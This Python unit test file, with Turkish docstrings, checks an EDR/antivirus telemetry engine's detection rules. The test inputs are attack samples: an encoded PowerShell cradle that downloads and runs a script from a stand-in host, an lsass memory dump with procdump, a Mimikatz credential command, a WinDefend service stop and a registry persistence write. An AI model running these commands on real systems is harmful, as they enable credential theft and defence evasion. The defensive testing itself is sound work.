"""
Gün 148: EDR, AV ve Uç Nokta Telemetri Birim Testleri
=====================================================
Bu test paketi; geleneksel statik antivirüs (AV) taramasını,
davranışsal EDR telemetri analizini, süreç soy ağacı anomalilerini,
bellek enjeksiyonlarını ve MITRE ATT&CK eşleşmelerini 15 kapsamlı
test senaryosuyla %100 doğrular.

Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
Özel Lisans — Tüm Hakları Saklıdır.
"""

import unittest
import sys
import os
import hashlib

# Uygulama modülünü arama yoluna ekle
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "uygulama")))

from edr_telemetry_engine import (
    EDRTelemetryEngine,
    TelemetryEvent,
    EventType,
    DetectionType,
    Severity,
    ResponseActionType
)


class TestEDRTelemetryEngine(unittest.TestCase):
    """EDR ve AV Telemetri Motoru Birim Test Sınıfı."""

    def setUp(self):
        """Her testten önce temiz ve izole bir motor örneği oluşturur."""
        self.engine = EDRTelemetryEngine()

    def test_01_clean_telemetry_batch_pass(self):
        """1. Test: Temiz ve olağan sistem olaylarının 100 tam puan almasını doğrular."""
        events = [
            TelemetryEvent(
                event_id="EV-001",
                timestamp="2026-11-03T10:00:00Z",
                event_type=EventType.PROCESS_CREATE,
                pid=1004,
                process_name="explorer.exe",
                parent_pid=800,
                parent_name="userinit.exe",
                command_line="C:\\Windows\\explorer.exe",
                user="KURUM\\seydi"
            ),
            TelemetryEvent(
                event_id="EV-002",
                timestamp="2026-11-03T10:00:05Z",
                event_type=EventType.NETWORK_CONNECT,
                pid=2040,
                process_name="chrome.exe",
                parent_pid=1004,
                parent_name="explorer.exe",
                command_line="\"C:\\Program Files\\Google\\Chrome\\chrome.exe\"",
                user="KURUM\\seydi",
                details={"dest_ip": "142.250.185.206", "dest_port": 443}
            )
        ]
        summary = self.engine.process_telemetry_batch(events)
        self.assertEqual(summary.security_score, 100.0)
        self.assertEqual(summary.total_alerts_count, 0)
        self.assertEqual(len(summary.killed_pids), 0)
        self.assertFalse(summary.isolated_hosts)

    def test_02_av_eicar_test_signature_detected(self):
        """2. Test: EICAR test dizgisi içeren dosyanın statik AV ile yakalanıp karantinaya alınmasını doğrular."""
        eicar_content = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        files = [{"path": "C:\\Users\\User\\Downloads\\eicar.com", "content": eicar_content}]
        summary = self.engine.process_telemetry_batch([], files_to_scan=files)
        self.assertEqual(summary.av_detections_count, 1)
        self.assertIn("C:\\Users\\User\\Downloads\\eicar.com", summary.quarantined_files)
        self.assertEqual(summary.alerts[0].detection_type, DetectionType.AV_SIGNATURE)
        self.assertEqual(summary.alerts[0].rule_id, "AV-SIG-001")

    def test_03_av_mimikatz_hash_detected(self):
        """3. Test: Bilinen Mimikatz hash veya komut kalıbının CRITICAL AV alarmı üretmesini doğrular."""
        mimi_content = "sekurlsa::logonpasswords /patch"
        files = [{"path": "C:\\Temp\\mimi.exe", "content": mimi_content}]
        summary = self.engine.process_telemetry_batch([], files_to_scan=files)
        self.assertEqual(summary.av_detections_count, 1)
        self.assertEqual(summary.alerts[0].severity, Severity.CRITICAL)
        self.assertEqual(summary.alerts[0].rule_id, "AV-SIG-002")

    def test_04_edr_office_macro_powershell_spawn(self):
        """4. Test: Word sürecinin PowerShell başlatmasının (Makro Phishing) EDR tarafından yakalanmasını doğrular."""
        event = TelemetryEvent(
            event_id="EV-MACRO-01",
            timestamp="2026-11-03T10:05:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=4500,
            process_name="powershell.exe",
            parent_pid=3200,
            parent_name="WINWORD.EXE",
            command_line="powershell.exe -ExecutionPolicy Bypass -NoProfile",
            user="KURUM\\kurban"
        )
        alerts = self.engine.analyze_event(event)
        self.assertGreaterEqual(len(alerts), 1)
        rule_ids = [a.rule_id for a in alerts]
        self.assertIn("EDR-RULE-001", rule_ids)
        self.assertEqual(alerts[0].recommended_action, ResponseActionType.KILL_PROCESS)

    def test_05_edr_encoded_powershell_download_cradle(self):
        """5. Test: Base64 kodlu (-enc) veya DownloadString içeren PowerShell'in yakalanmasını doğrular."""
        event = TelemetryEvent(
            event_id="EV-ENC-01",
            timestamp="2026-11-03T10:06:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=4550,
            process_name="powershell.exe",
            parent_pid=1004,
            parent_name="cmd.exe",
            command_line="powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AbABvAGMAYQBsAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
            user="KURUM\\saldirgan"
        )
        alerts = self.engine.analyze_event(event)
        self.assertGreaterEqual(len(alerts), 1)
        rule_ids = [a.rule_id for a in alerts]
        self.assertIn("EDR-RULE-002", rule_ids)
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)

    def test_06_edr_lsass_memory_dumping_detected(self):
        """6. Test: lsass.exe bellek okuma girişiminin (T1003.001) tespiti ve Host Isolation tavsiyesini doğrular."""
        event = TelemetryEvent(
            event_id="EV-LSASS-01",
            timestamp="2026-11-03T10:07:00Z",
            event_type=EventType.MEMORY_ACCESS,
            pid=6100,
            process_name="procdump64.exe",
            parent_pid=1004,
            parent_name="cmd.exe",
            command_line="procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
            user="KURUM\\saldirgan",
            details={"target_process": "C:\\Windows\\System32\\lsass.exe", "access_mask": "0x1010"}
        )
        alerts = self.engine.analyze_event(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "EDR-RULE-003")
        self.assertEqual(alerts[0].recommended_action, ResponseActionType.ISOLATE_HOST)

    def test_07_edr_process_injection_virtualalloc_createremotethread(self):
        """7. Test: CreateRemoteThread çapraz süreç bellek enjeksiyonunun (T1055) yakalanmasını doğrular."""
        event = TelemetryEvent(
            event_id="EV-INJECT-01",
            timestamp="2026-11-03T10:08:00Z",
            event_type=EventType.MEMORY_ACCESS,
            pid=7200,
            process_name="evil_injector.exe",
            parent_pid=1004,
            parent_name="explorer.exe",
            command_line="evil_injector.exe --target notepad.exe",
            user="KURUM\\saldirgan",
            details={"target_process": "notepad.exe", "call_trace": "ntdll.dll!NtCreateThreadEx|KERNELBASE.dll!CreateRemoteThread"}
        )
        alerts = self.engine.analyze_event(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "EDR-RULE-004")
        self.assertEqual(alerts[0].recommended_action, ResponseActionType.KILL_PROCESS)

    def test_08_edr_registry_run_key_persistence(self):
        """8. Test: CurrentVersion\\Run kalıcılık anahtarı yazımının (T1547.001) tespitini doğrular."""
        event = TelemetryEvent(
            event_id="EV-REG-01",
            timestamp="2026-11-03T10:09:00Z",
            event_type=EventType.REGISTRY_SET,
            pid=8100,
            process_name="backdoor.exe",
            parent_pid=1004,
            parent_name="cmd.exe",
            command_line="backdoor.exe --persist",
            user="KURUM\\saldirgan",
            details={
                "target_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value_name": "WindowsSecurityUpdater",
                "value_data": "C:\\ProgramData\\backdoor.exe"
            }
        )
        alerts = self.engine.analyze_event(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "EDR-RULE-005")

    def test_09_edr_c2_network_beaconing_detected(self):
        """9. Test: Şüpheli porta (4444) bağlanan bilinmeyen sürecin C2 olarak yakalanmasını doğrular."""
        event = TelemetryEvent(
            event_id="EV-NET-01",
            timestamp="2026-11-03T10:10:00Z",
            event_type=EventType.NETWORK_CONNECT,
            pid=9300,
            process_name="powershell.exe",
            parent_pid=1004,
            parent_name="explorer.exe",
            command_line="powershell.exe -c IEX",
            user="KURUM\\saldirgan",
            details={"dest_ip": "198.51.100.25", "dest_port": 4444}
        )
        alerts = self.engine.analyze_event(event)
        rule_ids = [a.rule_id for a in alerts]
        self.assertIn("EDR-RULE-006", rule_ids)

    def test_10_edr_tampering_service_stop_detected(self):
        """10. Test: WinDefend antivirüs servisini durdurma girişiminin (T1562.001) engellenmesini doğrular."""
        event = TelemetryEvent(
            event_id="EV-TAMPER-01",
            timestamp="2026-11-03T10:11:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=9900,
            process_name="cmd.exe",
            parent_pid=1004,
            parent_name="explorer.exe",
            command_line="net stop WinDefend",
            user="KURUM\\saldirgan"
        )
        alerts = self.engine.analyze_event(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "EDR-RULE-007")
        self.assertEqual(alerts[0].recommended_action, ResponseActionType.ISOLATE_HOST)

    def test_11_response_powershell_script_generation(self):
        """11. Test: Otomatik PowerShell müdahale betiğinin Stop-Process ve New-NetFirewallRule içermesini doğrular."""
        event = TelemetryEvent(
            event_id="EV-KILL-01",
            timestamp="2026-11-03T10:12:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=5555,
            process_name="powershell.exe",
            parent_pid=3200,
            parent_name="WINWORD.EXE",
            command_line="powershell.exe",
            user="KURUM\\kurban"
        )
        summary = self.engine.process_telemetry_batch([event])
        ps1_script = self.engine.generate_response_powershell(summary)
        self.assertIn("Stop-Process -Id 5555", ps1_script)

    def test_12_mitre_coverage_mapping(self):
        """12. Test: Tehdit analizinde MITRE ATT&CK tekniklerinin özet raporda listelenmesini doğrular."""
        event = TelemetryEvent(
            event_id="EV-MITRE-01",
            timestamp="2026-11-03T10:13:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=3333,
            process_name="powershell.exe",
            parent_pid=3200,
            parent_name="WINWORD.EXE",
            command_line="powershell.exe",
            user="KURUM\\kurban"
        )
        summary = self.engine.process_telemetry_batch([event])
        self.assertGreater(len(summary.mitre_coverage), 0)
        self.assertTrue(any("T1059" in tech for tech in summary.mitre_coverage))

    def test_13_killed_pids_collection(self):
        """13. Test: Sonlandırılacak PID listesinin tekilleştirildiğini doğrular."""
        event1 = TelemetryEvent(
            event_id="EV-P1",
            timestamp="2026-11-03T10:14:00Z",
            event_type=EventType.PROCESS_CREATE,
            pid=7777,
            process_name="powershell.exe",
            parent_pid=3200,
            parent_name="WINWORD.EXE",
            command_line="powershell.exe",
            user="KURUM\\kurban"
        )
        summary = self.engine.process_telemetry_batch([event1, event1])
        self.assertEqual(summary.killed_pids.count(7777), 1)

    def test_14_benign_browser_network_traffic_ignored(self):
        """14. Test: Meşru tarayıcı süreçlerinin standart portlara erişiminde alarm üretilmemesini doğrular."""
        event = TelemetryEvent(
            event_id="EV-CHROME-01",
            timestamp="2026-11-03T10:15:00Z",
            event_type=EventType.NETWORK_CONNECT,
            pid=1234,
            process_name="chrome.exe",
            parent_pid=1004,
            parent_name="explorer.exe",
            command_line="chrome.exe",
            user="KURUM\\kullanici",
            details={"dest_ip": "1.1.1.1", "dest_port": 443}
        )
        alerts = self.engine.analyze_event(event)
        self.assertEqual(len(alerts), 0)

    def test_15_mitre_matrix_json_structure(self):
        """15. Test: generate_mitre_matrix_json çıktısının ATT&CK taktik ve tekniklerini eksiksiz içermesini doğrular."""
        matrix = self.engine.generate_mitre_matrix_json()
        self.assertIn("cerceve", matrix)
        self.assertIn("taktik_ve_teknikler", matrix)
        self.assertGreaterEqual(len(matrix["taktik_ve_teknikler"]), 6)


if __name__ == "__main__":
    unittest.main()
